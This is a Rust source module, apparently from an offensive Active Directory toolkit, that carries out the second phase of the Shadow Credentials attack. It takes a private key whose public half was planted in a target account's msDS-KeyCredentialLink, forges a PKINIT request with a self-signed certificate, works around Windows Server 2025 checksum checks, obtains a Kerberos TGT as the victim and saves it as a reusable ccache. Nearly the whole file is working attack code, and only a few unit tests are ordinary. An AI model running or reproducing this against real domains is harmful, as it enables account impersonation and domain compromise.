//! Shadow Credentials Phase 2 — PKINIT authentication.
//!
//! Given the RSA key whose public half we registered in a target's `msDS-KeyCredentialLink`
//! (see [`crate::shadowcred`]), this performs a PKINIT AS-exchange to obtain a TGT *as that
//! target* — the second half of the Shadow Credentials attack (key-trust PKINIT):
//!
//!   1. Diffie-Hellman (RFC 3526 group 14) keypair for the exchange.
//!   2. `AuthPack` (PKAuthenticator + our DH public value), DER-encoded.
//!   3. CMS `SignedData` over the AuthPack, signed by a self-signed cert carrying our RSA
//!      public key (Windows key-trust matches this key against the registered KeyCredential,
//!      not a CA chain — so a self-signed cert is fine).
//!   4. AS-REQ with a `PA-PK-AS-REQ` pre-auth; parse the `PA-PK-AS-REP`, recover the KDC's
//!      DH public value, derive the reply key via `octetstring2key` (RFC 4556 §3.2.3.1), and
//!      decrypt the AS-REP enc-part. Successful decryption *is* the proof: only the holder of
//!      the registered key can complete the DH-signed exchange.
//!   5. Emit an MIT ccache so the TGT is reusable (`KRB5CCNAME`).
//!
//! The CMS envelope is hand-rolled (picky's `EncapsulatedContentInfo` is Authenticode-
//! specialised and rejects the PKINIT content-type OIDs); the KDC reply is walked as raw DER
//! so an unusual DC certificate can't break the parse.

use anyhow::{anyhow, bail, Result};
use rand::RngCore;
use rsa::pkcs8::DecodePrivateKey;
use rsa::traits::PublicKeyParts;
use rsa::{BigUint, Pkcs1v15Sign, RsaPrivateKey};
use sha1::Sha1;
use sha2::{Digest, Sha256};
use serde::{Deserialize, Serialize};

use picky_asn1::bit_string::BitString;
use picky_asn1::wrapper::{
    Asn1SequenceOf, Asn1SetOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1,
    ExplicitContextTag2, ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5,
    ExplicitContextTag7, ExplicitContextTag8, ImplicitContextTag0,
    IntegerAsn1, ObjectIdentifierAsn1, OctetStringAsn1, Optional,
    // (ExplicitContextTag5 reused for paChecksum2)
};
use picky_asn1_x509::pkcs7::signer_info::{CertificateSerialNumber, IssuerAndSerialNumber};
use picky_asn1_x509::{
    oids, AlgorithmIdentifier, Attribute, AttributeValues, Certificate, Extension, Extensions,
    Name, ShaVariant, SubjectPublicKeyInfo, TbsCertificate, Validity, Version,
};
use picky_asn1_x509::validity::Time;
use picky_asn1::date::UTCTime;

use picky_krb::constants::key_usages::AS_REP_ENC;
use picky_krb::constants::types::{AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST};
use picky_krb::crypto::{Cipher, CipherSuite};
use picky_krb::data_types::{KerberosTime, PaData};
use picky_krb::messages::{AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError};
use picky_krb::pkinit::{DhReqInfo, DhReqKeyInfo, DhDomainParameters};

use crate::{far_future_time, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_AES256};

const PA_PK_AS_REQ: u8 = 16;
const PA_PK_AS_REP: u8 = 17;

// -------------------------------------------------------------------------------------------
// Minimal CMS (RFC 5652) for the *outgoing* SignedData — leaf types reused from picky-asn1-x509.
// -------------------------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug)]
struct ContentInfo {
    content_type: ObjectIdentifierAsn1,
    content: ExplicitContextTag0<SignedData>,
}

#[derive(Serialize, Deserialize, Debug)]
struct SignedData {
    version: IntegerAsn1,
    digest_algorithms: Asn1SetOf<AlgorithmIdentifier>,
    encap_content_info: EncapContentInfo,
    // `certificates [0] IMPLICIT CertificateSet` and the signed-attrs below are constructed
    // context tags (0xA0). picky's ImplicitContextTag emits a *primitive* (0x80) tag, which a
    // strict CMS decoder (the Windows KDC) rejects — so these carry pre-tagged raw DER.
    certificates: Optional<Option<picky_asn1_der::Asn1RawDer>>,
    signer_infos: Asn1SetOf<SignerInfo>,
}

#[derive(Serialize, Deserialize, Debug)]
struct EncapContentInfo {
    content_type: ObjectIdentifierAsn1,
    content: Optional<Option<ExplicitContextTag0<OctetStringAsn1>>>,
}

#[derive(Serialize, Deserialize, Debug)]
struct SignerInfo {
    version: IntegerAsn1,
    sid: IssuerAndSerialNumber,
    digest_algorithm: AlgorithmIdentifier,
    // signedAttrs [0] IMPLICIT SET OF Attribute — raw DER with the constructed 0xA0 tag on the
    // wire; the signature is computed over the same octets re-tagged as `SET OF` (0x31), per
    // CMS / RFC 5652 §5.4.
    signed_attrs: Optional<Option<picky_asn1_der::Asn1RawDer>>,
    signature_algorithm: AlgorithmIdentifier,
    signature: OctetStringAsn1,
}

// -------------------------------------------------------------------------------------------
// PKAuthenticator with the Windows Server 2025 `paChecksum2` extension ([MS-PKCA]).
//
//   PKAuthenticator ::= SEQUENCE {
//       cusec          [0] INTEGER,
//       ctime          [1] KerberosTime,
//       nonce          [2] INTEGER,
//       paChecksum     [3] OCTET STRING OPTIONAL,   -- SHA-1 over KDC-REQ-BODY
//       freshnessToken [4] OCTET STRING OPTIONAL,   -- RFC 8070 (omitted)
//       paChecksum2    [5] PAChecksum2 OPTIONAL }   -- required by Server 2025
//   PAChecksum2 ::= SEQUENCE { checksum [0] OCTET STRING, algorithmIdentifier [1] AlgorithmIdentifier }
//
// Server 2025 returns KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED (79) when paChecksum2 is absent and
// KRB_AP_ERR_MODIFIED (41) when it is present but wrong. We build it by hand because picky's
// PkAuthenticator stops at [3]. Serialize-only.
#[derive(Serialize)]
struct PaChecksum2 {
    checksum: ExplicitContextTag0<OctetStringAsn1>,
    algorithm_identifier: ExplicitContextTag1<AlgorithmIdentifier>,
}

#[derive(Serialize)]
struct PkAuthenticator2 {
    cusec: ExplicitContextTag0<IntegerAsn1>,
    ctime: ExplicitContextTag1<KerberosTime>,
    nonce: ExplicitContextTag2<IntegerAsn1>,
    pa_checksum: Optional<Option<ExplicitContextTag3<OctetStringAsn1>>>,
    pa_checksum2: Optional<Option<ExplicitContextTag5<PaChecksum2>>>,
}

#[derive(Serialize)]
struct AuthPack2 {
    pk_authenticator: ExplicitContextTag0<PkAuthenticator2>,
    client_public_value: Optional<Option<ExplicitContextTag1<DhReqInfo>>>,
    supported_cms_types: Optional<Option<ExplicitContextTag2<Asn1SequenceOf<AlgorithmIdentifier>>>>,
    client_dh_nonce: Optional<Option<ExplicitContextTag3<OctetStringAsn1>>>,
}

// -------------------------------------------------------------------------------------------
// Diffie-Hellman — RFC 3526 2048-bit MODP group (group 14), generator 2.
// -------------------------------------------------------------------------------------------

const MODP_2048_HEX: &str = "\
FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74\
020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F1437\
4FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED\
EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF05\
98DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB\
9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B\
E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF695581718\
3995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF";

fn dh_params() -> (BigUint, BigUint, BigUint) {
    let p = BigUint::parse_bytes(MODP_2048_HEX.as_bytes(), 16).unwrap();
    let g = BigUint::from(2u32);
    let q = (&p - BigUint::from(1u32)) >> 1; // p = 2q + 1
    (p, g, q)
}

/// DER definite length encoding.
fn der_len(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else {
        let mut b = len.to_be_bytes().to_vec();
        while b.len() > 1 && b[0] == 0 {
            b.remove(0);
        }
        let mut out = vec![0x80 | b.len() as u8];
        out.extend(b);
        out
    }
}

/// Wrap `content` in a constructed context-specific `[n]` tag (0xA0 | n).
fn implicit_constructed(n: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![0xA0 | (n & 0x1f)];
    out.extend(der_len(content.len()));
    out.extend_from_slice(content);
    out
}

/// DER INTEGER (unsigned) content bytes: big-endian, 0x00-prefixed when the top bit is set.
fn der_uint(v: &BigUint) -> IntegerAsn1 {
    let mut b = v.to_bytes_be();
    if b.first().map_or(true, |x| x & 0x80 != 0) {
        b.insert(0, 0);
    }
    IntegerAsn1(b)
}

// -------------------------------------------------------------------------------------------
// Raw-DER reader — used to walk the KDC's CMS reply without a schema.
// -------------------------------------------------------------------------------------------

/// Read one DER TLV at `pos`; return (tag, content, next_pos_after_this_tlv).
fn tlv(buf: &[u8], pos: usize) -> Result<(u8, &[u8], usize)> {
    let tag = *buf.get(pos).ok_or_else(|| anyhow!("DER: truncated tag"))?;
    let b0 = *buf.get(pos + 1).ok_or_else(|| anyhow!("DER: truncated length"))?;
    let (len, hdr) = if b0 & 0x80 == 0 {
        (b0 as usize, 2)
    } else {
        let n = (b0 & 0x7f) as usize;
        let mut l = 0usize;
        for i in 0..n {
            l = (l << 8) | *buf.get(pos + 2 + i).ok_or_else(|| anyhow!("DER: truncated length"))? as usize;
        }
        (l, 2 + n)
    };
    let start = pos + hdr;
    let end = start + len;
    if end > buf.len() {
        bail!("DER: content overruns buffer");
    }
    Ok((tag, &buf[start..end], end))
}

/// First child TLV's content of the SEQUENCE/tag whose content is `buf`.
fn first(buf: &[u8]) -> Result<&[u8]> {
    Ok(tlv(buf, 0)?.1)
}

/// Walk `PA-PK-AS-REP` (dhInfo choice) → CMS ContentInfo → SignedData → eContent
/// (`KDCDHKeyInfo`) → the server's DH public value Y, plus the optional serverDHNonce.
fn server_dh_public(pa_pk_as_rep: &[u8]) -> Result<(BigUint, Option<Vec<u8>>)> {
    // PA-PK-AS-REP ::= CHOICE { dhInfo [0] DHRepInfo, ... } — [0] EXPLICIT of a SEQUENCE.
    let dhrep_tlv = first(pa_pk_as_rep)?; // content of [0] = DHRepInfo SEQUENCE (TLV)
    let dhrep = first(dhrep_tlv)?; // inner of DHRepInfo
    // DHRepInfo ::= SEQUENCE { dhSignedData [0] IMPLICIT OCTET STRING, serverDHNonce [1] OPTIONAL }
    let (_, content_info, after) = tlv(dhrep, 0)?; // [0] content = CMS ContentInfo DER
    // serverDHNonce [1] OPTIONAL — a context [1] wrapping an OCTET STRING.
    let server_nonce = if after < dhrep.len() {
        let (_, n1, _) = tlv(dhrep, after)?;
        Some(first(n1)?.to_vec())
    } else {
        None
    };

    // ContentInfo ::= SEQUENCE { contentType OID, content [0] EXPLICIT SignedData }
    let ci = first(content_info)?;
    let (_, _oid, p) = tlv(ci, 0)?;
    let c0 = tlv(ci, p)?.1; // [0] EXPLICIT content
    let sd = first(c0)?; // SignedData inner
    let (_, _ver, p) = tlv(sd, 0)?;
    let (_, _digalgs, p) = tlv(sd, p)?;
    let eci = tlv(sd, p)?.1; // encapContentInfo inner
    let (_, _etype, p) = tlv(eci, 0)?;
    let ec0 = tlv(eci, p)?.1; // [0] EXPLICIT
    let econtent = first(ec0)?; // OCTET STRING content = KDCDHKeyInfo DER

    // KDCDHKeyInfo ::= SEQUENCE { subjectPublicKey [0] BIT STRING, nonce [1] INT, ... }
    let ki = first(econtent)?;
    let spk0 = first(ki)?; // [0] EXPLICIT content = BIT STRING (TLV)
    let bitstr = first(spk0)?; // BIT STRING content: [unused-bits][DER INTEGER Y]
    let der_int = bitstr.get(1..).ok_or_else(|| anyhow!("empty subjectPublicKey"))?;
    let y = tlv(der_int, 0)?.1; // INTEGER Y content
    Ok((BigUint::from_bytes_be(y), server_nonce))
}

/// RFC 4556 §3.2.3.1 octetstring2key with SHA-1, truncated to the AES-256 key size (no DH nonces).
fn octetstring2key(zz: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut counter = 0u8;
    while out.len() < 32 {
        let mut h = Sha1::new();
        h.update([counter]);
        h.update(zz);
        out.extend_from_slice(&h.finalize());
        counter += 1;
    }
    out.truncate(32);
    out
}

fn nonce() -> IntegerAsn1 {
    let mut n = [0u8; 4];
    rand::thread_rng().fill_bytes(&mut n);
    n[0] &= 0x7f;
    // Canonical DER INTEGER: strip leading 0x00 unless needed to keep the value positive.
    let mut b = n.to_vec();
    while b.len() > 1 && b[0] == 0 && b[1] & 0x80 == 0 {
        b.remove(0);
    }
    IntegerAsn1(b)
}

fn kdc_options() -> BitStringAsn1 {
    BitStringAsn1::from(BitString::with_bytes(vec![0x40, 0x81, 0x00, 0x00]))
}

// -------------------------------------------------------------------------------------------
// Self-signed certificate carrying our RSA public key.
// -------------------------------------------------------------------------------------------

fn self_signed_cert(priv_key: &RsaPrivateKey, cn: &str) -> Result<(Certificate, IssuerAndSerialNumber)> {
    let modulus = der_uint(priv_key.n());
    let exponent = der_uint(priv_key.e());
    let spki = SubjectPublicKeyInfo::new_rsa_key(modulus, exponent);

    let mut serial = [0u8; 16];
    rand::thread_rng().fill_bytes(&mut serial);
    serial[0] &= 0x7f;
    let serial = IntegerAsn1(serial.to_vec());

    let name = Name::new_common_name(cn);
    let validity = Validity {
        not_before: Time::from(UTCTime::new(2020, 1, 1, 0, 0, 0).unwrap()),
        not_after: Time::from(UTCTime::new(2037, 1, 1, 0, 0, 0).unwrap()),
    };
    let extensions = Extensions(vec![Extension::new_basic_constraints(false, None)]);

    let tbs = TbsCertificate {
        version: ExplicitContextTag0::from(Version::V3),
        serial_number: serial.clone(),
        signature: AlgorithmIdentifier::new_sha256_with_rsa_encryption(),
        issuer: name.clone(),
        validity,
        subject: name.clone(),
        subject_public_key_info: spki,
        extensions: ExplicitContextTag3::from(extensions),
    };

    let tbs_der = picky_asn1_der::to_vec(&tbs).map_err(|e| anyhow!("encode TBS: {e}"))?;
    let sig = priv_key
        .sign(Pkcs1v15Sign::new::<Sha256>(), &Sha256::digest(&tbs_der))
        .map_err(|e| anyhow!("sign cert: {e}"))?;

    let cert = Certificate {
        tbs_certificate: tbs,
        signature_algorithm: AlgorithmIdentifier::new_sha256_with_rsa_encryption(),
        signature_value: BitStringAsn1::from(BitString::with_bytes(sig)).into(),
    };
    let sid = IssuerAndSerialNumber { issuer: name, serial_number: CertificateSerialNumber(serial) };
    Ok((cert, sid))
}

/// Result of a successful PKINIT AS-exchange.
pub struct PkinitTgt {
    pub ccache: Vec<u8>,
    pub session_key: Vec<u8>,
    pub end_time: String,
    pub sname: String,
}

/// Authenticate to `kdc` as `target_user@realm` using the private key whose public half is
/// registered in the target's `msDS-KeyCredentialLink`. Returns a reusable ccache.
pub async fn pkinit_authenticate(
    target_user: &str,
    realm: &str,
    kdc: &str,
    private_key_pem: &str,
) -> Result<PkinitTgt> {
    let realm = realm.to_uppercase();
    let user = target_user.split('@').next().unwrap_or(target_user);
    let user = user.rsplit('\\').next().unwrap_or(user);

    let priv_key = RsaPrivateKey::from_pkcs8_pem(private_key_pem)
        .map_err(|e| anyhow!("load private key: {e}"))?;

    let (p, g, q) = dh_params();
    // Ephemeral DH private exponent (256 bits is ample for a 2048-bit group).
    let mut xb = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut xb);
    let x = BigUint::from_bytes_be(&xb);
    let client_pub = g.modpow(&x, &p);

    // --- KDC-REQ-BODY (built once; paChecksum is SHA1 over its DER) ---
    let body = KdcReqBody {
        kdc_options: ExplicitContextTag0::from(kdc_options()),
        cname: Optional::from(Some(ExplicitContextTag1::from(principal(NT_PRINCIPAL, &[user])))),
        realm: ExplicitContextTag2::from(krb_string(&realm)),
        sname: Optional::from(Some(ExplicitContextTag3::from(principal(NT_SRV_INST, &["krbtgt", &realm])))),
        from: Optional::from(None),
        till: ExplicitContextTag5::from(far_future_time()),
        rtime: Optional::from(None),
        nonce: ExplicitContextTag7::from(nonce()),
        etype: ExplicitContextTag8::from(Asn1SequenceOf::from(vec![IntegerAsn1(vec![ETYPE_AES256])])),
        addresses: Optional::from(None),
        enc_authorization_data: Optional::from(None),
        additional_tickets: Optional::from(None),
    };
    let body_der = picky_asn1_der::to_vec(&body).map_err(|e| anyhow!("encode req-body: {e}"))?;
    // paChecksum:  SHA-1   over the KDC-REQ-BODY (RFC 4556 §3.2.1).
    // paChecksum2: SHA-256 over the KDC-REQ-BODY ([MS-PKCA]; required by Windows Server 2025 —
    //              its absence is what produces KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED).
    let pa_checksum = Sha1::digest(&body_der).to_vec();
    let pa_checksum2 = Sha256::digest(&body_der).to_vec();

    // --- AuthPack (PKAuthenticator + client DH public value) ---
    let pk_auth = PkAuthenticator2 {
        cusec: ExplicitContextTag0::from(IntegerAsn1(vec![0])),
        ctime: ExplicitContextTag1::from(now_kerberos_time()),
        nonce: ExplicitContextTag2::from(nonce()),
        pa_checksum: Optional::from(Some(ExplicitContextTag3::from(OctetStringAsn1(pa_checksum)))),
        pa_checksum2: Optional::from(Some(ExplicitContextTag5::from(PaChecksum2 {
            checksum: ExplicitContextTag0::from(OctetStringAsn1(pa_checksum2)),
            algorithm_identifier: ExplicitContextTag1::from(AlgorithmIdentifier::new_sha(ShaVariant::SHA2_256)),
        }))),
    };
    let dh_pub_der = picky_asn1_der::to_vec(&der_uint(&client_pub)).map_err(|e| anyhow!("encode DH pub: {e}"))?;
    let dh_req_info = DhReqInfo {
        key_info: DhReqKeyInfo {
            identifier: oids::diffie_hellman().into(),
            key_info: DhDomainParameters {
                p: der_uint(&p),
                g: der_uint(&g),
                q: der_uint(&q),
                j: Optional::from(None),
                validation_params: Optional::from(None),
            },
        },
        key_value: BitStringAsn1::from(BitString::with_bytes(dh_pub_der)),
    };
    // Real Windows clients advertise supported CMS types and a client DH nonce; Server 2025
    // rejects an AuthPack that omits them.
    let mut client_dh_nonce = vec![0u8; 32];
    rand::thread_rng().fill_bytes(&mut client_dh_nonce);
    let auth_pack = AuthPack2 {
        pk_authenticator: ExplicitContextTag0::from(pk_auth),
        client_public_value: Optional::from(Some(ExplicitContextTag1::from(dh_req_info))),
        supported_cms_types: Optional::from(Some(ExplicitContextTag2::from(Asn1SequenceOf::from(vec![
            AlgorithmIdentifier::new_sha256_with_rsa_encryption(),
        ])))),
        client_dh_nonce: Optional::from(Some(ExplicitContextTag3::from(OctetStringAsn1(client_dh_nonce.clone())))),
    };
    let auth_pack_der = picky_asn1_der::to_vec(&auth_pack).map_err(|e| anyhow!("encode AuthPack: {e}"))?;

    // --- CMS SignedData over the AuthPack, with CMS signed attributes ---
    let (cert, sid) = self_signed_cert(&priv_key, user)?;
    // DER-sorted order: content-type OID (…1.9.3) sorts before message-digest (…1.9.4).
    let signed_attrs = Asn1SetOf::from(vec![
        Attribute {
            ty: oids::content_type().into(),
            value: AttributeValues::ContentType(vec![oids::pkinit_auth_data().into()].into()),
        },
        Attribute::new_message_digest(Sha256::digest(&auth_pack_der).to_vec()),
    ]);
    // Signature is over the `SET OF` (0x31) encoding; the wire form re-tags to constructed [0].
    let signed_attrs_der = picky_asn1_der::to_vec(&signed_attrs).map_err(|e| anyhow!("encode signedAttrs: {e}"))?;
    let signature = priv_key
        .sign(Pkcs1v15Sign::new::<Sha256>(), &Sha256::digest(&signed_attrs_der))
        .map_err(|e| anyhow!("sign AuthPack: {e}"))?;
    let mut signed_attrs_wire = signed_attrs_der.clone();
    signed_attrs_wire[0] = 0xA0; // SET (0x31) → context [0] constructed (same length/content)
    let cert_der = picky_asn1_der::to_vec(&cert).map_err(|e| anyhow!("encode cert: {e}"))?;
    let signed_data = SignedData {
        version: IntegerAsn1(vec![3]),
        digest_algorithms: Asn1SetOf::from(vec![AlgorithmIdentifier::new_sha(ShaVariant::SHA2_256)]),
        encap_content_info: EncapContentInfo {
            content_type: oids::pkinit_auth_data().into(),
            content: Optional::from(Some(ExplicitContextTag0::from(OctetStringAsn1(auth_pack_der)))),
        },
        certificates: Optional::from(Some(picky_asn1_der::Asn1RawDer(implicit_constructed(0, &cert_der)))),
        signer_infos: Asn1SetOf::from(vec![SignerInfo {
            version: IntegerAsn1(vec![1]),
            sid,
            digest_algorithm: AlgorithmIdentifier::new_sha(ShaVariant::SHA2_256),
            signed_attrs: Optional::from(Some(picky_asn1_der::Asn1RawDer(signed_attrs_wire))),
            signature_algorithm: AlgorithmIdentifier::new_sha256_with_rsa_encryption(),
            signature: OctetStringAsn1(signature),
        }]),
    };
    let content_info = ContentInfo {
        content_type: oids::signed_data().into(),
        content: ExplicitContextTag0::from(signed_data),
    };
    let signed_auth_pack = picky_asn1_der::to_vec(&content_info).map_err(|e| anyhow!("encode CMS: {e}"))?;

    // --- PA-PK-AS-REQ padata ---
    // PA-PK-AS-REQ ::= SEQUENCE { signedAuthPack [0] IMPLICIT OCTET STRING, ... }
    let pa_pk_as_req = PaPkAsReqRaw {
        signed_auth_pack: ImplicitContextTag0::from(OctetStringAsn1(signed_auth_pack)),
    };
    let pa_data = PaData {
        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![PA_PK_AS_REQ])),
        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
            picky_asn1_der::to_vec(&pa_pk_as_req).map_err(|e| anyhow!("encode PA-PK-AS-REQ: {e}"))?,
        )),
    };

    let as_req = AsReq::from(KdcReq {
        pvno: ExplicitContextTag1::from(IntegerAsn1(vec![5])),
        msg_type: ExplicitContextTag2::from(IntegerAsn1(vec![AS_REQ_MSG_TYPE])),
        padata: Optional::from(Some(ExplicitContextTag3::from(Asn1SequenceOf::from(vec![pa_data])))),
        req_body: ExplicitContextTag4::from(body),
    });
    let raw = picky_asn1_der::to_vec(&as_req).map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
    let resp = kdc_exchange(kdc, &raw).await?;

    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
            Ok(err) => {
                let etext = err.0.e_text.0.as_ref().map(|t| String::from_utf8_lossy(t.0.as_bytes()).into_owned()).unwrap_or_default();
                let edata = err.0.e_data.0.as_ref().map(|d| hex::encode(&d.0 .0)).unwrap_or_default();
                anyhow!("KDC rejected PKINIT AS-REQ: error {} '{}' e-data={}", err.0.error_code.0, etext, edata)
            }
            Err(_) => anyhow!("AS-REP decode: {e}"),
        }
    })?;

    // --- recover server DH public value from PA-PK-AS-REP ---
    let padatas = as_rep
        .0
        .padata
        .0
        .as_ref()
        .ok_or_else(|| anyhow!("AS-REP has no padata (no PA-PK-AS-REP)"))?;
    let pk_rep = padatas
        .0
         .0
        .iter()
        .find(|pa| pa.padata_type.0 .0 == vec![PA_PK_AS_REP])
        .ok_or_else(|| anyhow!("AS-REP missing PA-PK-AS-REP"))?;
    let (server_pub, server_nonce) = server_dh_public(&pk_rep.padata_data.0 .0)?;

    // --- derive the reply key and decrypt the enc-part ---
    let zz = server_pub.modpow(&x, &p);
    let mut zz_bytes = zz.to_bytes_be();
    let plen = (p.bits() as usize + 7) / 8;
    while zz_bytes.len() < plen {
        zz_bytes.insert(0, 0);
    }
    // RFC 4556 §3.2.3.1: with both DH nonces present, the reply key is derived over
    // ZZ || clientDHNonce || serverDHNonce; otherwise over ZZ alone.
    let mut kdf_input = zz_bytes;
    if let Some(sn) = &server_nonce {
        kdf_input.extend_from_slice(&client_dh_nonce);
        kdf_input.extend_from_slice(sn);
    }
    let reply_key = octetstring2key(&kdf_input);

    let cipher: Box<dyn Cipher> = CipherSuite::Aes256CtsHmacSha196.cipher();
    let plain = cipher
        .decrypt(&reply_key, AS_REP_ENC, &as_rep.0.enc_part.0.cipher.0 .0)
        .map_err(|e| anyhow!("decrypt AS-REP (wrong reply key — PKINIT failed): {e}"))?;
    let enc_part: EncAsRepPart =
        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
    let session_key = enc_part.0.key.0.key_value.0 .0.clone();

    let ccache = build_ccache(&as_rep, &enc_part, &realm, user)?;
    let end_time = format!(
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}Z",
        enc_part.0.end_time.0 .0.year(),
        enc_part.0.end_time.0 .0.month(),
        enc_part.0.end_time.0 .0.day(),
        enc_part.0.end_time.0 .0.hour(),
        enc_part.0.end_time.0 .0.minute(),
        enc_part.0.end_time.0 .0.second(),
    );
    Ok(PkinitTgt { ccache, session_key, end_time, sname: format!("krbtgt/{realm}") })
}

// PA-PK-AS-REQ (request only — picky_krb's PaPkAsReq works but we keep the minimal shape local).
#[derive(Serialize)]
struct PaPkAsReqRaw {
    signed_auth_pack: ImplicitContextTag0<OctetStringAsn1>,
}

// -------------------------------------------------------------------------------------------
// MIT ccache v4 writer.
// -------------------------------------------------------------------------------------------

fn kerberos_epoch(t: &KerberosTime) -> u32 {
    let d = &t.0;
    let days = days_from_civil(d.year() as i64, d.month() as i64, d.day() as i64);
    (days * 86_400 + d.hour() as i64 * 3600 + d.minute() as i64 * 60 + d.second() as i64) as u32
}

fn days_from_civil(y: i64, m: i64, d: i64) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let doy = (153 * (if m > 2 { m - 3 } else { m + 9 }) + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146_097 + doe - 719_468
}

fn cvec(out: &mut Vec<u8>, data: &[u8]) {
    out.extend_from_slice(&(data.len() as u32).to_be_bytes());
    out.extend_from_slice(data);
}

fn write_principal(out: &mut Vec<u8>, name_type: u32, realm: &str, comps: &[&str]) {
    out.extend_from_slice(&name_type.to_be_bytes());
    out.extend_from_slice(&(comps.len() as u32).to_be_bytes());
    cvec(out, realm.as_bytes());
    for c in comps {
        cvec(out, c.as_bytes());
    }
}

fn build_ccache(as_rep: &AsRep, enc: &EncAsRepPart, realm: &str, user: &str) -> Result<Vec<u8>> {
    let mut c = Vec::new();
    // header
    c.extend_from_slice(&[0x05, 0x04]); // version 0x0504
    let header = [0x00u8, 0x01, 0x00, 0x08, 0, 0, 0, 0, 0, 0, 0, 0]; // one deltatime tag, zeroed
    c.extend_from_slice(&(header.len() as u16).to_be_bytes());
    c.extend_from_slice(&header);

    // default principal
    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]);

    // one credential
    write_principal(&mut c, NT_PRINCIPAL as u32, realm, &[user]); // client
    write_principal(&mut c, NT_SRV_INST as u32, realm, &["krbtgt", realm]); // server

    // keyblock: keytype, etype(0), keylen, key
    let key = &enc.0.key.0.key_value.0 .0;
    let keytype = enc.0.key.0.key_type.0 .0.iter().fold(0u16, |a, &b| (a << 8) | b as u16);
    c.extend_from_slice(&keytype.to_be_bytes());
    c.extend_from_slice(&0u16.to_be_bytes());
    c.extend_from_slice(&(key.len() as u16).to_be_bytes());
    c.extend_from_slice(key);

    // times: authtime, starttime, endtime, renew_till
    let authtime = kerberos_epoch(&enc.0.auth_time.0);
    let starttime = enc.0.start_time.0.as_ref().map(|t| kerberos_epoch(&t.0)).unwrap_or(authtime);
    let endtime = kerberos_epoch(&enc.0.end_time.0);
    let renew = enc.0.renew_till.0.as_ref().map(|t| kerberos_epoch(&t.0)).unwrap_or(0);
    for t in [authtime, starttime, endtime, renew] {
        c.extend_from_slice(&t.to_be_bytes());
    }

    c.push(0); // is_skey = false

    // tktflags: the 4-byte flag payload, big-endian
    let flags_der = picky_asn1_der::to_vec(&enc.0.flags.0).map_err(|e| anyhow!("encode flags: {e}"))?;
    let flag_bytes = flags_der.get(flags_der.len().saturating_sub(4)..).unwrap_or(&[0, 0, 0, 0]);
    c.extend_from_slice(flag_bytes);

    c.extend_from_slice(&0u32.to_be_bytes()); // num_address
    c.extend_from_slice(&0u32.to_be_bytes()); // num_authdata

    // ticket, then empty second-ticket
    let ticket_der = picky_asn1_der::to_vec(&as_rep.0.ticket.0).map_err(|e| anyhow!("encode ticket: {e}"))?;
    cvec(&mut c, &ticket_der);
    cvec(&mut c, &[]);

    Ok(c)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dh_group_is_2048_bit_safe_prime() {
        let (p, g, q) = dh_params();
        assert_eq!(p.bits(), 2048);
        assert_eq!(g, BigUint::from(2u32));
        assert_eq!(&q * BigUint::from(2u32) + BigUint::from(1u32), p); // p = 2q+1
    }

    #[test]
    fn octetstring2key_len_and_determinism() {
        let k1 = octetstring2key(&[0x11; 256]);
        let k2 = octetstring2key(&[0x11; 256]);
        assert_eq!(k1.len(), 32);
        assert_eq!(k1, k2);
        assert_ne!(k1, octetstring2key(&[0x22; 256]));
    }

    #[test]
    fn der_reader_roundtrips_nested() {
        // SEQUENCE { OCTET STRING "hi" }
        let der = [0x30, 0x04, 0x04, 0x02, b'h', b'i'];
        let inner = first(&der).unwrap();
        assert_eq!(tlv(inner, 0).unwrap().1, b"hi");
    }

    #[test]
    fn days_from_civil_epoch() {
        assert_eq!(days_from_civil(1970, 1, 1), 0);
        assert_eq!(days_from_civil(2000, 1, 1), 10_957);
    }
}
